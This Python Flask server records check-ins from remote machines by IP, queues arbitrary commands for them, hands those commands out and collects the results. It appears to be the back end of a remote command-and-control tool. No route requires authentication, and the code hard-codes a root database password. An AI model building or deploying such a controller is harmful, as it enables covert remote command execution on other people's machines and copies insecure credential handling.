from flask import Flask, request, jsonify,render_template
from flask_sqlalchemy import SQLAlchemy
import datetime
app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:123456@localhost/mydb'

db = SQLAlchemy(app)

class OnlineMachine(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(255), unique=True)
    last_ping = db.Column(db.DateTime)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.Integer, db.ForeignKey('online_machine.id'))
    command = db.Column(db.String(255))
    result = db.Column(db.String(255))
    status = db.Column(db.Integer) 

@app.route('/result', methods=['POST'])
def receive_result():
    machine_ip = request.form.get('machine_ip')
    result = request.form.get('result')

    machine = OnlineMachine.query.filter_by(ip_address=machine_ip).first()
    if machine:
        command = Command.query.filter_by(machine_id=machine.id, status=0).first()
        if command:
            command.result = result
            command.status = 1
            db.session.commit()

    return 'OK'

@app.route('/give', methods=['POST'])
def give_command():
    machine_ip = request.form.get('machine_ip')
    command_text = request.form.get('command')

    machine = OnlineMachine.query.filter_by(ip_address=machine_ip).first()
    if machine:
        command = Command(machine_id=machine.id, command=command_text, status=0)
        db.session.add(command)
        db.session.commit()

    return 'OK'

@app.route('/get', methods=['GET'])
def get_command():
    machine_ip = request.args.get('machine_ip')

    machine = OnlineMachine.query.filter_by(ip_address=machine_ip).first()
    if machine:
        command = Command.query.filter_by(machine_id=machine.id, status=0).first()
        if command:
            return jsonify({'command': command.command})

    return jsonify({'command': ''})

@app.route('/ping', methods=['POST'])
def receive_ping():
    machine_ip = request.form.get('machine_ip')

    machine = OnlineMachine.query.filter_by(ip_address=machine_ip).first()
    if machine:
        machine.last_ping = datetime.datetime.now()
    else:
        machine = OnlineMachine(ip_address=machine_ip, last_ping=datetime.datetime.now())
        db.session.add(machine)

    db.session.commit()
    return 'OK'

@app.route('/show', methods=['GET'])
def show_status():
    machines = OnlineMachine.query.all()
    status = []
    for machine in machines:
        print(machine.ip_address)
        commands = Command.query.filter_by(machine_id=machine.id).all()
        command_list = [{'command': cmd.command, 'result': cmd.result, 'status': cmd.status} for cmd in commands]
        status.append({'machine_ip': machine.ip_address, 'last_ping': machine.last_ping, 'commands': command_list})

    return jsonify(status)

@app.route('/')
def index():
    return render_template('index.html')


with app.app_context():

    if __name__ == '__main__':
        db.create_all()
        app.run(ssl_context=('cert.pem', 'key.pem'))